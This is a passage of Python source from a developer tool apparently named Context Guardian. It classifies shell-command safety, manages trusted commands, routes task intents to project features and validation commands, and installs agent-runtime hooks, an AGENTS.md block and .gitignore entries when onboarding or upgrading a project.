    return {c for c in entries if isinstance(c, str) and c.strip()} if isinstance(entries, list) else set()


def set_command_trust(project: Path, command: str, trusted: bool) -> dict[str, Any]:
    command = command.strip()
    if not command:
        raise ProfileError("empty command")
    if trusted and _inspect_command_safety(command)["tier"] == "disallowed":
        raise ProfileError(f"a disallowed command cannot be trusted: {command}")
    store = _load_trust_store()
    key = _trust_key(project)
    entries = [c for c in store["projects"].get(key, []) if isinstance(c, str) and c != command]
    if trusted:
        entries.append(command)
    if entries:
        store["projects"][key] = sorted(entries)
    else:
        store["projects"].pop(key, None)
    store["version"] = 1
    _write_json_atomic(trust_store_path(), store)
    return {"status": "ok", "project": key, "command": command, "trusted": trusted,
            "store": str(trust_store_path()), "approved": sorted(entries)}


def inspect_command_safety(
    command: str, trusted: set[str] | None = None, requested: set[str] | None = None
) -> dict[str, Any]:
    result = _inspect_command_safety(command)
    # A person can vouch for a project-specific check (`node scripts/audit.cjs`)
    # that no generic rule can recognise, on their own machine. Nobody can
    # vouch for a command that matches a disallowed pattern.
    if result["tier"] == "requires-approval":
        if trusted and command.strip() in trusted:
            result["tier"] = "safe"
            result["safe_to_auto_run"] = True
            result["reasons"] = ["Approved on this machine (context-guardian trust)"]
        elif requested and command.strip() in requested:
            result["reasons"] = sorted(result["reasons"] + [
                "Listed in commands.trusted by the repository but not approved on this machine; "
                f"to approve: {CLI_COMMAND} trust --project . --command {shlex.quote(command.strip())}"
            ])
    return result


def command_safety(command: str, profile: dict[str, Any] | None, project: Path | None) -> dict[str, Any]:
    return inspect_command_safety(command, trusted_commands(profile, project), requested_trusted_commands(profile))


def _inspect_command_safety(command: str) -> dict[str, Any]:
    trimmed = command.strip()
    segments, balanced = _scan_shell(trimmed)
    if not segments:
        return {
            "command": trimmed,
            "tier": "requires-approval",
            "safe_to_auto_run": False,
            "reasons": ["Empty command"],
            "segments": [],
        }
    if not balanced:
        return {
            "command": trimmed,
            "tier": "requires-approval",
            "safe_to_auto_run": False,
            "reasons": ["Unclosed quote"],
            "segments": [{"command": trimmed, "tier": "requires-approval", "reasons": ["Unclosed quote"]}],
        }

    verdicts = [(segment, _classify_segment(segment)) for segment in segments]
    worst = max(verdicts, key=lambda item: TIER_ORDER[item[1]["tier"]])[1]["tier"]

    reasons: list[str] = []
    for segment, verdict in verdicts:
        if verdict["tier"] != worst:
            continue
        for reason in verdict["reasons"]:
            label = reason if len(verdicts) == 1 else f"{reason} (`{segment}`)"
            if label not in reasons:
                reasons.append(label)

    return {
        "command": trimmed,
        "tier": worst,
        "safe_to_auto_run": worst == "safe",
        "reasons": sorted(reasons),
        "segments": [
            {"command": segment, "tier": verdict["tier"], "reasons": sorted(verdict["reasons"])}
            for segment, verdict in verdicts
        ],
    }


def _normalized_intent_terms(value: str) -> set[str]:
    """Return lightweight lexical variants without language-model dependencies."""
    raw_terms = {
        token.lower()
        for token in re.findall(r"[a-zA-Z0-9]+", value)
        if len(token) >= 2
    }
    normalized = set(raw_terms)
    for term in raw_terms:
        if len(term) > 4 and term.endswith("ies"):
            normalized.add(term[:-3] + "y")
        if len(term) > 4 and term.endswith("es"):
            normalized.add(term[:-2])
        if len(term) > 3 and term.endswith("s"):
            normalized.add(term[:-1])
    return normalized


def route_task_intent(
    project: Path,
    profile: dict[str, Any],
    intent_text: str,
    *,
    map_data: dict[str, Any] | None = None,
    validation_level: str = "quick",
) -> dict[str, Any]:
    project = project.expanduser().resolve()
    tokens = _normalized_intent_terms(intent_text)

    features_by_id = {f["id"]: f for f in profile.get("features", [])}
    scored_features: list[tuple[int, dict[str, Any], list[str]]] = []

    for feature in profile.get("features", []):
        feat_id = feature["id"]
        matched_terms: set[str] = set()
        score = 0

        # Check feature ID keywords
        feat_id_tokens = _normalized_intent_terms(feat_id)
        direct_matches = tokens & feat_id_tokens
        if direct_matches:
            score += len(direct_matches) * 5
            matched_terms.update(direct_matches)

        # Check triggers
        for trig in feature.get("triggers", []):
            trig_tokens = _normalized_intent_terms(trig)
            trig_matches = tokens & trig_tokens
            if trig_matches:
                score += len(trig_matches) * 2
                matched_terms.update(trig_matches)

        # Check references/invariants names
        for ref in feature.get("references", []) + feature.get("invariants", []):
            ref_tokens = _normalized_intent_terms(ref)
            ref_matches = tokens & ref_tokens
            if ref_matches:
                score += len(ref_matches)
                matched_terms.update(ref_matches)

        if score > 0:
            scored_features.append((score, feature, sorted(matched_terms)))

    scored_features.sort(key=lambda x: (-x[0], x[1]["id"]))

    selected_by_id: dict[str, dict[str, Any]] = {}
    references: set[str] = set(profile.get("global_invariants", []))
    validation: set[str] = set()

    for score, feat, terms in scored_features:
        fid = feat["id"]
        selected_by_id[fid] = {
            "id": fid,
            "matched_by": ["intent"],
            "intent_score": score,
            "matched_terms": terms,
        }
        references.update(feat.get("references", []))
        references.update(feat.get("invariants", []))
        validation.update(feat.get("validation", []))

    # Transitive dependencies
    dep_queue = list(selected_by_id.keys())
    visited_deps = set(dep_queue)
    while dep_queue:
        curr_id = dep_queue.pop(0)
        curr_def = features_by_id.get(curr_id)
        if not curr_def:
            continue
        for dep_id in curr_def.get("depends_on", []):
            dep_def = features_by_id.get(dep_id)
            if not dep_def:
                continue
            if dep_id in selected_by_id:
                if "dependency" not in selected_by_id[dep_id]["matched_by"]:
                    selected_by_id[dep_id]["matched_by"].append("dependency")
            else:
                selected_by_id[dep_id] = {
                    "id": dep_id,
                    "matched_by": ["dependency"],
                    "intent_score": 0,
                    "matched_terms": [f"depends on {curr_id}"],
                }
                references.update(dep_def.get("references", []))
                references.update(dep_def.get("invariants", []))
                validation.update(dep_def.get("validation", []))
            if dep_id not in visited_deps:
                visited_deps.add(dep_id)
                dep_queue.append(dep_id)

    # Candidate source files from map or triggers
    candidate_files: set[str] = set()
    if map_data is not None:
        for node in map_data.get("nodes", []):
            if (node.get("kind") == "file" and node.get("path")
                    and _safe_repository_path(project, node["path"])):
                p = node["path"]
                path_tokens = _normalized_intent_terms(p)
                if tokens & path_tokens:
                    candidate_files.add(p)
            elif node.get("kind") == "symbol" and node.get("name"):
                sname = node["name"].lower()
                if any(t in sname for t in tokens):
                    if node.get("path"):
                        candidate_files.add(node["path"])

    commands = profile.get("commands", {}) if isinstance(profile.get("commands"), dict) else {}
    quick_cmds = commands.get("quick", [])
    full_cmds = commands.get("full", [])

    validation_plan: list[dict[str, Any]] = []
    seen_plan_cmds: set[str] = set()

    if validation_level in ("quick", "all"):
        for cmd in quick_cmds:
            if cmd not in seen_plan_cmds:
                validation_plan.append(
                    {
                        "command": cmd,
                        "source": "global-quick",
                        "level": "quick",
                        "safety": command_safety(cmd, profile, project),
                    }
                )
                seen_plan_cmds.add(cmd)
    if validation_level in ("full", "all"):
        for cmd in full_cmds:
            if cmd not in seen_plan_cmds:
                validation_plan.append(
                    {
                        "command": cmd,
                        "source": "global-full",
                        "level": "full",
                        "safety": command_safety(cmd, profile, project),
                    }
                )
                seen_plan_cmds.add(cmd)

    for feat_id, feat_entry in selected_by_id.items():
        feat_def = features_by_id.get(feat_id, {})
        for cmd in feat_def.get("validation", []):
            if cmd not in seen_plan_cmds:
                validation_plan.append(
                    {
                        "command": cmd,
                        "source": f"feature:{feat_id}",
                        "level": "feature",
                        "safety": command_safety(cmd, profile, project),
                    }
                )
                seen_plan_cmds.add(cmd)

    return {
        "status": "ok",
        "app_id": profile["app_id"],
        "intent": intent_text,
        "matched_features": list(selected_by_id.values()),
        "candidate_files_count": len(candidate_files),
        "candidate_files": sorted(candidate_files)[:REPORT_PATH_LIMIT],
        "read": sorted(references),
        "feature_validation": sorted(validation),
        "validation_plan": validation_plan,
    }


def detect_cross_platform_twins(all_files: list[str]) -> list[dict[str, Any]]:
    files_set = set(all_files)
    twins: list[dict[str, Any]] = []
    seen_pairs: set[frozenset[str]] = set()

    for f in all_files:
        norm = f.replace("\\", "/")
        # 1. Extension twins: .ios.tsx / .android.tsx
        for ext_pattern in (r"\.ios\.", r"\.android\."):
            if re.search(ext_pattern, norm, re.IGNORECASE):
                counterpart = (
                    re.sub(r"\.ios\.", ".android.", norm, flags=re.IGNORECASE)
                    if ".ios." in norm.lower()
                    else re.sub(r"\.android\.", ".ios.", norm, flags=re.IGNORECASE)
                )
                if counterpart in files_set and counterpart != norm:
                    pair = frozenset([norm, counterpart])
                    if pair not in seen_pairs:
                        seen_pairs.add(pair)
                        ios_file = norm if ".ios." in norm.lower() else counterpart
                        android_file = counterpart if ".ios." in norm.lower() else norm
                        twins.append(
                            {
                                "id": f"twin:{ios_file}",
                                "kind": "platform-extension",
                                "members": [
                                    {"platform": "ios", "path": ios_file},
                                    {"platform": "android", "path": android_file},
                                ],
                            }
                        )

        # 2. Directory twins: ios/... <-> android/...
        if norm.startswith("ios/") or "/ios/" in norm:
            counterpart = norm.replace("ios/", "android/", 1)
            possible_counterparts = [counterpart]
            if counterpart.endswith(".swift"):
                possible_counterparts.append(counterpart[:-6] + ".kt")
            for c in possible_counterparts:
                if c in files_set and c != norm:
                    pair = frozenset([norm, c])
                    if pair not in seen_pairs:
                        seen_pairs.add(pair)
                        twins.append(
                            {
                                "id": f"twin:{norm}",
                                "kind": "platform-directory",
                                "members": [
                                    {"platform": "ios", "path": norm},
                                    {"platform": "android", "path": c},
                                ],
                            }
                        )

    return sorted(twins, key=lambda t: t["id"])


def analyze_twin_synchronization(
    project: Path,
    changed_files: list[str],
    profile: dict[str, Any] | None = None,
    all_repo_files: list[str] | None = None,
) -> dict[str, Any]:
    project = project.expanduser().resolve()
    if all_repo_files is None:
        # Keep the library API usable with synthetic paths supplied by callers and
        # tests; CLI usage still inventories the real repository.
        if project.is_dir():
            all_repo_files, _ = repository_files(project)
        else:
            all_repo_files = list(changed_files)

    twins = detect_cross_platform_twins(all_repo_files)
    changed_set = {p.replace("\\", "/") for p in changed_files}
    intentional_patterns = profile.get("intentional_differences", []) if profile else []

    unsynchronized: list[dict[str, Any]] = []
    synchronized: list[dict[str, Any]] = []
    intentional: list[dict[str, Any]] = []

    for twin in twins:
        members = twin["members"]
        paths = [m["path"] for m in members]
        touched = [p for p in paths if p in changed_set]
        untouched = [p for p in paths if p not in changed_set]

        if not touched:
            continue

        if not untouched:
            synchronized.append(twin)
        else:
            is_intentional = any(
                any(path_matches(p, pat) for pat in intentional_patterns)
                for p in paths
            )
            if is_intentional:
                intentional.append({**twin, "touched": touched, "untouched": untouched})
            else:
                unsynchronized.append(
                    {
                        **twin,
                        "touched": touched,
                        "untouched": untouched,
                        "message": f"Touched {', '.join(touched)} but counterpart {', '.join(untouched)} was not modified",
                    }
                )

    return {
        "status": "ok",
        "total_twins_count": len(twins),
        "active_twins_count": len(synchronized) + len(unsynchronized) + len(intentional),
        "synchronized_count": len(synchronized),
        "intentional_count": len(intentional),
        "unsynchronized_count": len(unsynchronized),
        "unsynchronized_twins": unsynchronized,
        "synchronized_twins": synchronized,
        "intentional_twins": intentional,
    }


def _write_json_atomic(path: Path, data: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    handle, temporary_name = tempfile.mkstemp(
        prefix=f".{path.name}.", suffix=".tmp", dir=path.parent
    )
    try:
        with os.fdopen(handle, "w", encoding="utf-8") as temporary:
            json.dump(data, temporary, ensure_ascii=False, indent=2)
            temporary.write("\n")
        os.replace(temporary_name, path)
    except BaseException:
        try:
            os.unlink(temporary_name)
        except FileNotFoundError:
            pass
        raise


def _load_settings_object(path: Path) -> dict[str, Any]:
    if not path.exists():
        return {}
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise MapError(f"cannot safely merge runtime settings {path}: {exc}") from exc
    if not isinstance(value, dict):
        raise MapError(f"runtime settings must contain a JSON object: {path}")
    return value


MANAGED_HOOK_NAMES = {"context-guardian-start", "context-guardian-finish"}
# Handlers written before the CLI existed ran this script by absolute path; they
# are still recognised so `upgrade` replaces them instead of adding a second one.
LEGACY_CONNECTOR_SCRIPT_NAME = "runtime_connector.py"
MANAGED_HOOK_COMMAND = re.compile(rf"(^|[\s/\\]){re.escape(CLI_COMMAND)}(\.exe)?\s+hook(\s|$)")
# Claude Code measures hook timeouts in seconds, Gemini CLI in milliseconds. The
# same 60000 was written to both, which gave Claude Code a 16-hour timeout.
CLAUDE_HOOK_TIMEOUT_SECONDS = 60
GEMINI_HOOK_TIMEOUT_MS = 60_000
GITIGNORE_START = "# context-guardian:start"
GITIGNORE_END = "# context-guardian:end"
GITIGNORE_ENTRIES = (
    ".app-context/runs/",
    ".app-context/findings.json",
    ".app-context/watcher.json",
)
AGENTS_START = "<!-- context-guardian:start -->"
AGENTS_END = "<!-- context-guardian:end -->"


def hook_command(runtime: str, event: str) -> str:
    """The hook command written into a project's runtime settings.

    It names the installed CLI only: no path, no interpreter, no shell syntax,
    so the same committed line works on every machine and in sh, bash, or
    PowerShell. The project comes from the runtime's own environment
    (`CLAUDE_PROJECT_DIR`, `GEMINI_PROJECT_DIR`, or the working directory).

    On a machine without the CLI the shell exits 127. Both Claude Code and
    Gemini CLI treat any exit code other than 0 and 2 as a non-blocking error:
    they show a warning and the agent carries on, unchecked.
    """
    return f"{CLI_COMMAND} hook --runtime {runtime} --event {event}"


def _is_managed_handler(handler: Any) -> bool:
    if not isinstance(handler, dict):
        return False
    if handler.get("name") in MANAGED_HOOK_NAMES:
        return True
    command = handler.get("command")
    return isinstance(command, str) and (
        LEGACY_CONNECTOR_SCRIPT_NAME in command or MANAGED_HOOK_COMMAND.search(command) is not None
    )


def _merge_hook_into_settings(settings: dict[str, Any], event: str, handler: dict[str, Any], path: Path) -> None:
    """Install exactly one managed handler for `event`, preserving everything else.

    Managed handlers are recognised by name *or* by the connector script in
    their command, so handlers written by older versions (and handlers whose
    non-standard `name` field was dropped) are replaced rather than duplicated.
    The handler keeps its position when one already exists.
    """
    hooks = settings.setdefault("hooks", {})
    if not isinstance(hooks, dict):
        raise MapError(f"runtime settings hooks must be an object: {path}")
    event_groups = hooks.setdefault(event, [])
    if not isinstance(event_groups, list):
        raise MapError(f"runtime hook event must be an array: {path}#{event}")

    placed = False
    merged_groups: list[Any] = []
    for group in event_groups:
        if not isinstance(group, dict) or not isinstance(group.get("hooks"), list):
            merged_groups.append(group)
            continue
        handlers: list[Any] = []
        for existing in group["hooks"]:
            if _is_managed_handler(existing):
                if not placed:
                    handlers.append(handler)
                    placed = True
                continue
            handlers.append(existing)
        if handlers:
            merged_groups.append({**group, "hooks": handlers})
    if not placed:
        merged_groups.append({"hooks": [handler]})
    hooks[event] = merged_groups


def _settings_has_managed_hooks(settings: dict[str, Any]) -> bool:
    hooks = settings.get("hooks")
    if not isinstance(hooks, dict):
        return False
    for groups in hooks.values():
        if not isinstance(groups, list):
            continue
        for group in groups:
            if isinstance(group, dict) and isinstance(group.get("hooks"), list):
                if any(_is_managed_handler(h) for h in group["hooks"]):
                    return True
    return False


def _hook_specs() -> list[dict[str, Any]]:
    return [
        {
            "runtime": "claude-code",
            "path": Path(".claude/settings.json"),
            "events": [
                ("UserPromptSubmit", {"type": "command", "command": hook_command("claude-code", "UserPromptSubmit"), "timeout": CLAUDE_HOOK_TIMEOUT_SECONDS}),
                ("Stop", {"type": "command", "command": hook_command("claude-code", "Stop"), "timeout": CLAUDE_HOOK_TIMEOUT_SECONDS}),
            ],
        },
        {
            "runtime": "gemini-cli",
            "path": Path(".gemini/settings.json"),
            "events": [
                ("BeforeAgent", {"type": "command", "name": "context-guardian-start", "command": hook_command("gemini-cli", "BeforeAgent"), "timeout": GEMINI_HOOK_TIMEOUT_MS}),
                ("AfterAgent", {"type": "command", "name": "context-guardian-finish", "command": hook_command("gemini-cli", "AfterAgent"), "timeout": GEMINI_HOOK_TIMEOUT_MS}),
            ],
        },
    ]


def _write_text_if_changed(path: Path, new_text: str, old_text: str | None, dry_run: bool) -> str:
    if old_text == new_text:
        return "unchanged"
    if not dry_run:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(new_text, encoding="utf-8")
    return "create" if old_text is None else "update"


def install_runtime_hooks(
    project: Path,
    *,
    only_existing: bool = False,
    dry_run: bool = False,
) -> list[dict[str, Any]]:
    actions: list[dict[str, Any]] = []
    for spec in _hook_specs():
        settings_path = project_write_path(project, spec["path"])
        old_text = settings_path.read_text(encoding="utf-8") if settings_path.is_file() else None
        settings = _load_settings_object(settings_path)
        if only_existing and not _settings_has_managed_hooks(settings):
            actions.append({"target": str(spec["path"]), "change": "not-installed"})
            continue
        for event, handler in spec["events"]:
            _merge_hook_into_settings(settings, event, handler, settings_path)
        new_text = json.dumps(settings, ensure_ascii=False, indent=2) + "\n"
        if old_text is not None:
            try:
                if json.loads(old_text) == settings:
                    new_text = old_text
            except json.JSONDecodeError:
                pass
        if new_text != old_text and not dry_run:
            _write_json_atomic(settings_path, settings)
            change = "create" if old_text is None else "update"
        else:
            change = "unchanged" if new_text == old_text else ("create" if old_text is None else "update")
        actions.append({"target": str(spec["path"]), "runtime": spec["runtime"], "change": change})
    return actions


def codex_instruction_block() -> str:
    engine = CLI_COMMAND
    return (
        f"{AGENTS_START}\n"
        "## Context Guardian\n\n"
        "`.app-context/profile.json` is this application's routing source. The commands below need the "
        f"`{CLI_COMMAND}` command; if it is missing, install it with `uv tool install context-guardian-cli`.\n\n"
        "For every implementation task, from the repository root:\n\n"
        f"1. `{engine} begin --project .` and keep the returned `run_id`.\n"
        f"2. `{engine} preflight-intent --project . --intent \"<task summary>\"` before editing.\n"
        f"3. Before the final response: `{engine} finish --project . --run <run_id>`.\n"
        "   - `retry`: an error-level issue; fix it and run `finish` again.\n"
        "   - `report` with `user_action_required`: tell the user the findings and ask before changing anything.\n\n"
        "These commands are local and deterministic and use no model tokens. This is an instruction-level "
        "fallback, not a native completion hook.\n"
        f"{AGENTS_END}"
    )


def merge_codex_instructions(
    project: Path,
    *,
    only_existing: bool = False,
    dry_run: bool = False,
) -> dict[str, Any]:
    agents_path = project_write_path(project, Path("AGENTS.md"))
    existing = agents_path.read_text(encoding="utf-8") if agents_path.is_file() else None
    text = existing or ""
    if (AGENTS_START in text) != (AGENTS_END in text):
        raise MapError(f"cannot safely merge incomplete Context Guardian block: {agents_path}")
    if only_existing and AGENTS_START not in text:
        return {"target": "AGENTS.md", "change": "not-installed"}
    block = codex_instruction_block()
    if AGENTS_START in text:
        prefix, remainder = text.split(AGENTS_START, 1)
        _, suffix = remainder.split(AGENTS_END, 1)
        merged = (prefix.rstrip() + "\n\n" if prefix.strip() else "") + block + suffix
    else:
        merged = text.rstrip() + ("\n\n" if text.strip() else "") + block + "\n"
    change = _write_text_if_changed(agents_path, merged, existing, dry_run)
    return {"target": "AGENTS.md", "runtime": "codex", "change": change}


def merge_gitignore(project: Path, *, dry_run: bool = False) -> dict[str, Any]:
    """Keep per-turn bookkeeping out of commits.

    Entries the project already ignores (line for line, or through a broader
    `.app-context/` rule) are not repeated; the managed block holds only what
    is missing and disappears when nothing is.
    """
    path = project_write_path(project, Path(".gitignore"))
    existing = path.read_text(encoding="utf-8") if path.is_file() else None
    text = existing or ""
    if (GITIGNORE_START in text) != (GITIGNORE_END in text):
        raise MapError(f"cannot safely merge incomplete Context Guardian block: {path}")
    if GITIGNORE_START in text:
        prefix, remainder = text.split(GITIGNORE_START, 1)
        _, suffix = remainder.split(GITIGNORE_END, 1)
        outside = prefix + suffix
    else:
        prefix, suffix, outside = text, "", text
    lines = {line.strip().lstrip("/") for line in outside.splitlines()}
    broad = {".app-context", ".app-context/", ".app-context/*", ".app-context/**"}
    needed = [] if lines & broad else [e for e in GITIGNORE_ENTRIES if e not in lines and e.rstrip("/") not in lines]
    block = "\n".join([GITIGNORE_START, *needed, GITIGNORE_END]) if needed else ""
    if GITIGNORE_START in text:
        if block:
            merged = prefix + block + suffix
        else:
            merged = prefix.rstrip("\n") + ("\n" if prefix.strip() else "") + suffix.lstrip("\n")
    elif block:
        merged = text.rstrip("\n") + ("\n\n" if text.strip() else "") + block + "\n"
    else:
        merged = text
    if existing is None and not merged:
        return {"target": ".gitignore", "change": "unchanged"}
    change = _write_text_if_changed(path, merged, existing, dry_run)
    return {"target": ".gitignore", "change": change}


def _sanitize_identifier(value: str, fallback: str) -> str:
    cleaned = re.sub(r"[^a-z0-9]+", "-", value.lower()).strip("-")
    return cleaned or fallback


def detect_package_manager(project: Path) -> str:
    if (project / "pnpm-lock.yaml").is_file():
        return "pnpm"
    if (project / "yarn.lock").is_file():
        return "yarn"
    if (project / "bun.lockb").is_file() or (project / "bun.lock").is_file():
        return "bun"
    return "npm"


def package_scripts(project: Path) -> dict[str, str] | None:
    """package.json scripts; None when there is no package.json."""
    path = project / "package.json"
    if not path.is_file():
        return None
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}
    scripts = data.get("scripts") if isinstance(data, dict) else None
    if not isinstance(scripts, dict):
        return {}
    return {k: v for k, v in scripts.items() if isinstance(k, str) and isinstance(v, str)}


def script_invocation(manager: str, name: str) -> str:
    if manager == "npm":
        return "npm test" if name == "test" else f"npm run {name}"
    if manager == "yarn":
        return f"yarn {name}"
    if manager == "pnpm":
        return "pnpm test" if name == "test" else f"pnpm run {name}"
    return f"bun run {name}"


def missing_package_scripts(project: Path, commands: list[str]) -> list[dict[str, str]]:
    """Profile commands that invoke a package.json script which does not exist."""
    scripts = package_scripts(project)
    missing: list[dict[str, str]] = []
    for command in commands:
        for segment in split_shell_segments(command):
            tokens = _segment_tokens(segment)
            if not tokens:
                continue
            manager = Path(tokens[0]).name.lower()
            if manager not in PACKAGE_MANAGERS:
                continue
            name = _package_script_name(manager, tokens[1:])
            if not name:
                continue
            if scripts is None:
                missing.append({"command": command, "script": name, "reason": "no package.json"})
            elif name not in scripts:
                missing.append({"command": command, "script": name, "reason": "script not defined in package.json"})
    return missing


def _detect_validation_commands(project: Path, all_files: list[str]) -> tuple[list[str], list[str], list[str], list[str]]:
    """Return (stacks, quick, full, notes). Only commands that can actually run."""
    stacks: list[str] = []
    quick: list[str] = []
    full: list[str] = []
    notes: list[str] = []

    scripts = package_scripts(project)
    if scripts is not None:
        is_ts = any(f.endswith((".ts", ".tsx")) for f in all_files)
        stacks.append("typescript" if is_ts else "javascript")
        manager = detect_package_manager(project)
        quick_name = next((n for n in ("typecheck", "type-check", "tsc", "lint") if n in scripts), None)
        if quick_name is None and "test" in scripts:
            quick_name = "test"
        if quick_name:
            quick.append(script_invocation(manager, quick_name))
        for name in ("test", "lint", "typecheck", "type-check"):
            if name in scripts:
                full.append(script_invocation(manager, name))
        if not quick_name:
            notes.append("package.json defines no test/lint/typecheck script; add validation commands to the profile manually.")

    pyproject = project / "pyproject.toml"
    if pyproject.is_file() or (project / "requirements.txt").is_file() or (project / "setup.py").is_file():
        stacks.append("python")
        pyproject_text = pyproject.read_text(encoding="utf-8", errors="replace") if pyproject.is_file() else ""
        has_tests = (
            (project / "tests").is_dir() or (project / "test").is_dir()
            or (project / "pytest.ini").is_file() or (project / "conftest.py").is_file()
            or "[tool.pytest" in pyproject_text
        )
        if has_tests:
            quick.append("python3 -m pytest -q")
            full.append("python3 -m pytest")
        if "[tool.ruff" in pyproject_text or (project / "ruff.toml").is_file() or (project / ".ruff.toml").is_file():
            full.append("ruff check .")
        if not has_tests:
            notes.append("No Python test suite detected; add validation commands to the profile manually.")

    if (project / "Cargo.toml").is_file():
        stacks.append("rust")
        quick.append("cargo check")
        full.append("cargo test")
    if (project / "go.mod").is_file():
        stacks.append("go")
        quick.append("go vet ./...")
        full.append("go test ./...")

    has_xcode = any(
        part.endswith((".xcodeproj", ".xcworkspace"))
        for f in all_files for part in f.split("/")
    )
    if (project / "Package.swift").is_file():
        stacks.append("swift")
        quick.append("swift test")
    elif has_xcode:
        stacks.append("swift")
        notes.append("Xcode project detected; add an `xcodebuild test -scheme <Scheme> ...` command to the profile manually.")

    gradle_markers = ("build.gradle", "build.gradle.kts", "settings.gradle", "settings.gradle.kts")
    if any((project / marker).is_file() for marker in gradle_markers):
        stacks.append("jvm")
        runner = "./gradlew" if (project / "gradlew").is_file() else "gradle"
        quick.append(f"{runner} test")
        full.append(f"{runner} check")

    if not stacks:
        stacks.append("generic")
        notes.append("No known build system detected; add validation commands to the profile manually.")
    return stacks, list(dict.fromkeys(quick)), list(dict.fromkeys(full)), notes


def bootstrap_project(
    project: Path,
    *,
    app_id: str | None = None,
    display_name: str | None = None,
    setup_hooks: bool = True,
) -> dict[str, Any]:
    project = project.expanduser().resolve()
    all_files, _ = repository_files(project)

    detected_stacks, quick_commands, full_commands, notes = _detect_validation_commands(project, all_files)

    derived_app_id = _sanitize_identifier(app_id or project.name, "app")
    derived_display_name = (
        display_name or project.name.replace("-", " ").replace("_", " ").title()
    )

    # A feature is a directory below a conventional source root. `src/index.ts`
    # is a file, not a feature; `src/auth` and `lib/auth` are one feature.
    feature_triggers: dict[str, list[str]] = {}
    for f in all_files:
        parts = f.replace("\\", "/").split("/")
        if len(parts) >= 3 and parts[0] in ("src", "lib", "app", "packages", "services", "modules"):
            feat_id = _sanitize_identifier(parts[1], "")
            if not feat_id:
                continue
            trigger = f"{parts[0]}/{parts[1]}/**"
            triggers = feature_triggers.setdefault(feat_id, [])
            if trigger not in triggers:
                triggers.append(trigger)

    features: list[dict[str, Any]] = [
        {
            "id": feat_id,
            "triggers": sorted(triggers),
            "references": [f".app-context/features/{feat_id}.md"],
        }
        for feat_id, triggers in sorted(feature_triggers.items())
    ]
    if not features:
        features.append(
            {
                "id": "core",
                "triggers": ["src/**", "lib/**", "**/*.py", "**/*.ts", "**/*.js"],
                "references": [".app-context/features/core.md"],
            }
        )

    app_context_dir = project_write_path(project, Path(".app-context"))
    invariants_dir = project_write_path(project, app_context_dir / "invariants")
    features_dir = project_write_path(project, app_context_dir / "features")
    invariants_dir.mkdir(parents=True, exist_ok=True)
    features_dir.mkdir(parents=True, exist_ok=True)

    profile_path = project_write_path(project, PROFILE_RELATIVE_PATH)
    profile_created = False
    if not profile_path.is_file():
        profile_content = {
            "schema_version": 1,
            "app_id": derived_app_id,
            "display_name": derived_display_name,
            "stacks": detected_stacks,
            "global_invariants": [".app-context/invariants/product.md"],
            "commands": {
                "quick": quick_commands,
                "full": full_commands,
            },
            "features": features,
        }
        validate_profile(profile_content)
        _write_json_atomic(profile_path, profile_content)
        profile_created = True

        product_inv = project_write_path(project, invariants_dir / "product.md")
        if not product_inv.is_file():
            product_inv.write_text(
                f"# {derived_display_name} Core Product Invariants\n\n"
                "1. Maintain backwards-compatible data models and serialization.\n"
                "2. Ensure all external API and state mutations are validated and error-handled.\n"
                "3. Keep automated test suites passing before finishing tasks.\n",
                encoding="utf-8",
            )

        # Feature skeletons only accompany a profile created here. An existing
        # profile is curated; inventing docs for directories it does not list
        # would contradict it.
        for feat in features:
            fdoc = project_write_path(project, features_dir / f"{feat['id']}.md")
            if not fdoc.is_file():
                fdoc.write_text(
                    f"# Feature: {feat['id'].replace('-', ' ').title()}\n\n"
                    f"Scope: `{', '.join(feat['triggers'])}`\n\n"
                    "## Invariants\n"
                    "- Keep feature contracts clean and modular.\n",
                    encoding="utf-8",
                )
    else:
        notes.append("Existing profile kept unchanged; detected commands and features were not applied.")

    actions: list[dict[str, Any]] = [merge_gitignore(project)]
    installed_hooks: list[str] = []
    if setup_hooks:
        actions.extend(install_runtime_hooks(project))
        installed_hooks.extend(["claude-code", "gemini-cli"])
        actions.append(merge_codex_instructions(project))
        installed_hooks.append("codex-instructions")

    # The map is built last so the files written above do not make it stale on
    # the very first task.
    map_data = build_application_map(project)
    map_dest = write_application_map(project, map_data)

    return {
        "status": "ok",
        "project": str(project),
        "app_id": derived_app_id,
        "display_name": derived_display_name,
        "profile": str(profile_path),
        "profile_created": profile_created,
        "map": str(map_dest),
        "detected_stacks": detected_stacks,
        "features_count": len(features),
        "hooks_installed": installed_hooks,
        "actions": actions,
        "notes": notes,
    }


def upgrade_project(
    project: Path,
    *,
    dry_run: bool = False,
    refresh_map: bool = True,
) -> dict[str, Any]:
    """Bring an onboarded project's Context Guardian files up to this version.

    Changes only Context Guardian-managed material: hook handlers, the AGENTS.md
    block, the .gitignore block and the generated map. Curated files (profile,
    invariants, feature docs) are never edited; problems in them are reported.
    Integrations are refreshed only where they were installed before. Handlers
    from older versions, which ran the connector script by absolute path, are
    replaced with the `context-guardian hook` command.
    """
    project = project.expanduser().resolve()
    if not (project / PROFILE_RELATIVE_PATH).is_file():
        return {"status": "not-onboarded", "project": str(project)}

    findings: list[dict[str, Any]] = []
    profile: dict[str, Any] | None = None
    try:
        profile = load_profile(project)
    except ProfileError as exc:
        findings.append({"code": "invalid-profile", "message": str(exc)})

    actions: list[dict[str, Any]] = []
    actions.extend(install_runtime_hooks(project, only_existing=True, dry_run=dry_run))
    actions.append(merge_codex_instructions(project, only_existing=True, dry_run=dry_run))
    actions.append(merge_gitignore(project, dry_run=dry_run))

    map_file = project / MAP_RELATIVE_PATH
    if not refresh_map:
        actions.append({"target": str(MAP_RELATIVE_PATH), "change": "skipped"})
    elif not map_file.is_file():
        if not dry_run:
            write_application_map(project, build_application_map(project))
        actions.append({"target": str(MAP_RELATIVE_PATH), "change": "create"})
    else:
        try:
            existing_map = load_application_map(project, MAP_RELATIVE_PATH)
            freshness = check_map_freshness(project, existing_map)
            if freshness["is_fresh"]:
                actions.append({"target": str(MAP_RELATIVE_PATH), "change": "unchanged"})
            else:
                if not dry_run:
                    write_application_map(project, refresh_application_map(project, existing_map))
                actions.append({"target": str(MAP_RELATIVE_PATH), "change": "update", "reasons": freshness["stale_reasons"]})
        except MapError as exc:
            if not dry_run:
                write_application_map(project, build_application_map(project))
            actions.append({"target": str(MAP_RELATIVE_PATH), "change": "rebuild", "reason": str(exc)})

